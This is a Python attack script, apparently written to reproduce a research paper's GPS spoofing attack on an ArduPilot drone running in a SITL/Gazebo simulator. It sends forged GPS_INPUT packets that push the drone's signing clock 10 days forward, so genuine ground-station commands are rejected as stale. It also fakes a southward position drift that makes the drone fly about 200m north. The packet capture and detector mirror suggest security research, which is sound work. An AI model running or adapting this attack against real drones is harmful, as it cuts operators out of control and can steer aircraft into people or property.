#!/usr/bin/env python3
"""
=============================================================
ATTACK 2 — GPS Timestamp + Position Spoofing
=============================================================
From the paper: Stage 2 — Section IV-C-2b  /  Algorithm 1

SIMPLE EXPLANATION:
    We inject FAKE GPS_INPUT messages with TWO lies:

    LIE 1 — Timestamp:
        We claim GPS time is 10 days in the future.
        UAV's signing clock jumps +10 days.
        Every real GCS command (dated today) is then rejected
        as "stale" — the drone stops listening to the GCS.

    LIE 2 — Position (makes it visible in Gazebo):
        We gradually move the reported GPS position
        SOUTH by up to 200m over 30 seconds.
        The UAV's EKF tracks this drift and the autopilot
        tries to correct → drone physically flies NORTH
        in Gazebo to "hold position" against the fake drift.

HOW POSITION SPOOFING CAUSES MOVEMENT:
    Drone is told to hold at home position (LOITER/GUIDED).
    GPS says drone is now 200m south of home.
    EKF believes it: "I am 200m south, I need to go north."
    Autopilot fires northward thrust.
    → Drone moves north in Gazebo. Fully visible.

WHAT HAPPENS STEP BY STEP:
    1. Load MAVProxy GPSInput module (UDP 25100)
    2. Send GPS_INPUT: timestamp = now + 10 days
    3. Send GPS_INPUT: position gradually drifts south
    4. UAV clock jumps 10 days → commands rejected
    5. UAV physically moves north compensating for fake drift
    6. In Gazebo: watch drone fly north from takeoff point

BEFORE RUNNING THIS SCRIPT — type in MAVProxy:
    param set GPS1_TYPE 14
    param set SIM_GPS1_DISABLE 1
    module load GPSInput
    mode GUIDED
    arm throttle
    takeoff 20
=============================================================
"""

import time
import datetime
import subprocess
import os
import signal
import sys
import socket
import json

# ──────────────────────────────────────────────────────────────
# Settings
# ──────────────────────────────────────────────────────────────

GPS_INPUT_HOST   = "127.0.0.1"
GPS_INPUT_PORT   = 25100           # MAVProxy GPSInput module listens here

SPOOF_DAYS       = 10              # advance clock by this many days
SPOOF_OFFSET_SEC = SPOOF_DAYS * 86400

DURATION_SEC     = 30              # how long to keep spoofing
SEND_RATE_HZ     = 5               # GPS messages per second

# Drone home position (ArduPilot SITL Canberra default)
HOME_LAT = -35.363261
HOME_LON =  149.165237
HOME_ALT =  584.0

# Position spoof: gradually report the drone drifting SOUTH by ~200m.
# The autopilot compensates by physically flying NORTH in Gazebo.
# 0.0018 degrees lat ≈ 200m at this latitude.
SPOOF_LAT_DRIFT = -0.0018   # degrees south (negative = south)
SPOOF_LON_DRIFT =  0.0      # no east/west drift

# GPS epoch — January 6, 1980
GPS_EPOCH_UNIX   = 315964800
SECONDS_PER_WEEK = 604800

# Capture file
RESULTS_DIR = os.path.join(os.path.dirname(__file__), "results")
PCAP_FILE   = os.path.join(RESULTS_DIR, "attack2_capture.pcap")


# ──────────────────────────────────────────────────────────────
# Helper: Unix time → GPS week + time-of-week
# ──────────────────────────────────────────────────────────────

def unix_to_gps(unix_time: float):
    elapsed = unix_time - GPS_EPOCH_UNIX
    week    = int(elapsed / SECONDS_PER_WEEK)
    tow_ms  = int((elapsed % SECONDS_PER_WEEK) * 1000)
    return week, tow_ms


# ──────────────────────────────────────────────────────────────
# Main attack
# ──────────────────────────────────────────────────────────────

def main():
    print()
    print("=" * 55)
    print("  ATTACK 2 — GPS Timestamp Spoofing")
    print("=" * 55)

    now       = time.time()
    spoofed   = now + SPOOF_OFFSET_SEC

    print()
    print(f"  Real time now  : {datetime.datetime.utcfromtimestamp(now).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  Spoofed time   : {datetime.datetime.utcfromtimestamp(spoofed).strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  Clock offset   : +{SPOOF_DAYS} days")
    print()
    print(f"  Position spoof : reporting drone drifting SOUTH ~200m over {DURATION_SEC}s")
    print(f"  Visible effect : drone flies NORTH in Gazebo to compensate")
    print(f"  Home lat       : {HOME_LAT}")
    print(f"  Final fake lat : {HOME_LAT + SPOOF_LAT_DRIFT:.6f}  (~200m south)")
    print()
    print(f"  GPS input port : {GPS_INPUT_HOST}:{GPS_INPUT_PORT}")
    print(f"  Duration       : {DURATION_SEC} seconds  at  {SEND_RATE_HZ} Hz")
    print()
    print("  Make sure you ran these in MAVProxy:")
    print("    param set GPS1_TYPE 14")
    print("    param set SIM_GPS1_DISABLE 1")
    print("    module load GPSInput")
    print("    mode GUIDED  →  arm throttle  →  takeoff 20")
    print()
    input("  Press ENTER to start the attack...")
    print()

    # ── Start tshark capture ──────────────────────────────────
    os.makedirs(RESULTS_DIR, exist_ok=True)
    print(f"[1/3] Starting packet capture → results/attack2_capture.pcap")
    tshark = subprocess.Popen(
        ["tshark", "-i", "lo",
         "-F", "pcap",
         "-f", f"udp port {GPS_INPUT_PORT} or udp port 14550",
         "-w", PCAP_FILE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)

    # ── Open raw UDP socket to MAVProxy GPS input port ───────
    # Reference simulate-gps.py sends JSON, not binary MAVLink.
    # MAVProxy GPSInput module accepts JSON packets on UDP 25100.
    print(f"[2/3] Opening UDP socket → {GPS_INPUT_HOST}:{GPS_INPUT_PORT} (JSON format, reference method)...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    out_addr = (GPS_INPUT_HOST, GPS_INPUT_PORT)
    print(f"      Ready to inject GPS_INPUT as JSON with spoofed timestamps")
    print()

    # ── Send spoofed GPS_INPUT messages as JSON ───────────────
    print(f"[3/3] Injecting spoofed GPS (timestamp +{SPOOF_DAYS} days + position drift south)...")
    print(f"      Watch the drone fly NORTH in Gazebo →")
    print()

    total    = DURATION_SEC * SEND_RATE_HZ
    interval = 1.0 / SEND_RATE_HZ

    for i in range(total):
        spoofed_unix = time.time() + SPOOF_OFFSET_SEC
        week, tow_ms = unix_to_gps(spoofed_unix)

        # Linearly drift the reported position southward over the full duration.
        # progress goes 0.0 → 1.0 as the attack runs.
        # The EKF tracks this drift and the autopilot compensates northward.
        progress   = i / total
        fake_lat   = HOME_LAT + (SPOOF_LAT_DRIFT * progress)
        fake_lon   = HOME_LON + (SPOOF_LON_DRIFT * progress)

        data = {
            'time_usec':          int(spoofed_unix * 1_000_000),
            'gps_id':             0,
            'ignore_flags':       0,
            'time_week_ms':       tow_ms,
            'time_week':          week,
            'fix_type':           3,
            'lat':                int(fake_lat * 1e7),   # spoofed — drifting south
            'lon':                int(fake_lon * 1e7),
            'alt':                HOME_ALT,
            'hdop':               1,
            'vdop':               1,
            'vn':                 0,
            've':                 0,
            'vd':                 0,
            'speed_accuracy':     0.3,
            'horiz_accuracy':     1.0,
            'vert_accuracy':      1.5,
            'satellites_visible': 10,
        }
        pkt = json.dumps(data).encode()
        sock.sendto(pkt, out_addr)
        sock.sendto(pkt, (GPS_INPUT_HOST, 25101))  # mirror to detector monitor port

        if i % SEND_RATE_HZ == 0:
            elapsed    = i // SEND_RATE_HZ
            ts_str     = datetime.datetime.utcfromtimestamp(spoofed_unix).strftime('%Y-%m-%d %H:%M:%S')
            drift_m    = abs(SPOOF_LAT_DRIFT * progress) * 111_320
            print(f"  [{elapsed:3d}s / {DURATION_SEC}s]"
                  f"  GPS time: {ts_str}"
                  f"  |  fake lat: {fake_lat:.6f}"
                  f"  (drift: {drift_m:.0f}m south)")

        time.sleep(interval)

    sock.close()

    # ── Stop capture ──────────────────────────────────────────
    time.sleep(1)
    tshark.send_signal(signal.SIGINT)
    tshark.wait(timeout=5)

    pcap_size = os.path.getsize(PCAP_FILE) if os.path.exists(PCAP_FILE) else 0

    print()
    print("─" * 55)
    print("  ATTACK COMPLETE")
    print()
    print(f"  Capture saved : {PCAP_FILE}")
    print(f"  Capture size  : {pcap_size} bytes")
    print()
    print("  WHAT YOU SHOULD HAVE SEEN IN GAZEBO:")
    print("  ✓ Drone was armed and hovering at home position")
    print("  ✓ As attack ran, drone flew NORTH ~200m")
    print("    (compensating for the reported southward GPS drift)")
    print()
    print("  VERIFY THE CLOCK EFFECT — type in MAVProxy:")
    print("    time")
    print("  → Should show date 10 days in the FUTURE")
    print()
    print("  VERIFY COMMAND REJECTION — type in MAVProxy:")
    print("    mode LAND")
    print("  → Command should be REJECTED (timestamp too old)")
    print()
    print("  BOTH EFFECTS DEMONSTRATED:")
    print("  ✓ Position effect : drone physically moved in Gazebo")
    print("  ✓ Clock effect    : signing clock +10 days, GCS rejected")
    print()
    print("  Open capture:")
    print(f"  wireshark {PCAP_FILE}")
    print("─" * 55)
    print()


if __name__ == "__main__":
    main()
